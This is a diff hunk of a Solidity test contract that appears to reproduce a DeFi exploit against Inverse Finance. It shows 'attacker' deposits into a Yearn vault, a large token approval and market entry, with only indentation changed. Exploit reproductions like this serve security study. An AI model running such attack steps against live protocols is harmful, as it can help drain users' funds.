@@ -64,7 +64,7 @@ contract ContractTest is DSTest {
         yvCurve3Crypto.deposit(5_375_596_969_399_930_881_565, address(this));
         emit log_named_uint(
             "Deposited to Yearns Vault, yvCurve3 balance of attacker:", yvCurve3Crypto.balanceOf(address(this))
-            );
+        );
         yvCurve3Crypto.approve(
             0x1429a930ec3bcf5Aa32EF298ccc5aB09836EF587,
             100_000_000_000_000_000_000_000_000_000_000_000_000_000_000_000_000
@@ -73,7 +73,7 @@ contract ContractTest is DSTest {
         emit log_named_uint(
             "Deposited to Inverse Yearn 3Crypto Vault, anYvCrv3Crypto balance of attacker:",
             anYvCrv3CryptoInverse.balanceOf(address(this))
-            );
+        );
         address[] memory toEnter = new address[](1);
         toEnter[0] = 0x1429a930ec3bcf5Aa32EF298ccc5aB09836EF587;
         Unitroller.enterMarkets(toEnter);
